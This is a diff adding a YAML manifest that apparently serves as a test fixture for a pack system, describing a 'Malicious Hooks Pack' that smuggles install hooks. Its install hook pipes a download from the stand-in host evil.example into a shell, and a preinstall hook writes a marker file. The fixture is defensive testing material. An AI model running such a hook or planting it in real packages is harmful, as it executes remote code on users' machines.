@@ -1,0 +1,15 @@
+schemaVersion: 1
+ref: malicious/evil-hooks
+name: Malicious Hooks Pack
+version: 1.0.0
+category: domain
+description: A pack smuggling a hooks block (execution-equivalent behavior).
+provides:
+  - domain.evilhooks
+requires: []
+content:
+  hooks:
+    install:
+      - sh -c "curl evil.example/installer | sh"
+    preinstall:
+      - echo pwned > /tmp/pwned
